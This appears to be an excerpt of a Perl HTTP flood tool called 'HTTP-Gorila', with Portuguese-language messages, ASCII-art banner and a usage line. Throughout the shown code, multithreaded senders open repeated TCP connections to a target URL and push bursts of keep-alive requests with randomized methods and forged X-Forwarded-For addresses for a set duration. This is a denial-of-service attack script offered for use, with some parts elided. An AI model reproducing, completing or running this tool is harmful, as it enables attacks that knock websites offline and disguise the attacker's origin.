...
sub sender {
    ...
    for (;time() <= $endtime;) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $porta, Proto => 'tcp');
        unless($sock) {
            sleep(1);
            next;
        }
        for($i=0;$i<$porconexion;$i++) {
            $ipinicial = $somador->mais();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
                        ...
                        if($method eq "GHP"){
                                $atualmethod = $ghp[int(rand($#ghp))];
                        }
                        else{
                                $atualmethod = $method;
                        }

            $paquete .= join "",$atualmethod," ",$file,$randsemilla," HTTP/1.1\r\nHost: ",$host,"\r\nX-Forwarded-For: ",$ipfake,".",int(rand(255)+1),".",int(rand(255)+1),"\r\nUser-Agent: ",$ua,"\r\nAccept: */*\r\nAccept-Language: ",$al,"\r\nAccept-Encoding: *\r\nAccept-Charset: *r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        }
...
sub sender_pps {
    ...
    for (;time() <= $endtime;) {
        ...
        #for($i=0;$i<$porconexion;$i++) {
                #
        #    $paquete .= join "",$atualmethod," ",$file," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nAccept: */*\r\nAccept-Language: ",$al,"\r\nAccept-Encoding: *\r\nAccept-Charset: *r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        #}
        #$paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Keep-Alive\r\n\r\n/;
...
#sub sender_pps {
#
#    my ($porta,$host,$paquete) = @_;
#    my $sock;
#    my $somador :shared;
#       my $endtime = time() + ($time ? $time : 1000000);
#    for (;time() <= $endtime;) {
#        $sock = &socker($host,$porta);
#        unless($sock) {
#            sleep(1);
#            next;
#        }
...
sub comecar {
    ...
    $method = $ARGV[3];
        ...
        system('title HTTP-Gorila Powerfull Edited @ by Vanqui$h');
        system('cls');
    if($porconexion < 1) {
        print "[-] Invalido arg 3...\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        die("[x] URL Invalido!\n");
...
░▓█▒░██▓  ▒██▒ ░   ▒██▒ ░ ▒██▒ ░  ░
 ...
 ░  ░  ░
    ...
    if($ipfake eq "") {
        ...
        for($v=0;$v<$max;$v++) {
            $thr[$v] = threads->create('sender2', ($porta,$host,$paquetesender));
        }
    }
        elsif($method eq "PPS") {
        # envio com ip...
        $somador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
                        print "[i] Iniciando threads.. " . $v . "/" . $max . "\r";
            $thr[$v] = threads->create('sender_pps', ($porconexion,$porta,$host,$file));
        }
                print "[i] Todos threads iniciados!          \r\n";
    }
        else {
        # envio com ip...
        $somador = control->new($ipfake);
        for($v=0;$v<$max;$v++) {
                        print "[i] Iniciando threads.. " . $v . "/" . $max . "\r";
            $thr[$v] = threads->create('sender', ($porconexion,$porta,$host,$file));
        }
                print "[i] Todos threads iniciados!          \r\n";
    }
...
if($#ARGV > 4) {
    ...
    die("[i] Use: HTTP-Multi.pl [http://google.com/?q=] [Connections] [Requests per connection] [Method] [Initial false IP (13.37)] [Duration]\n")};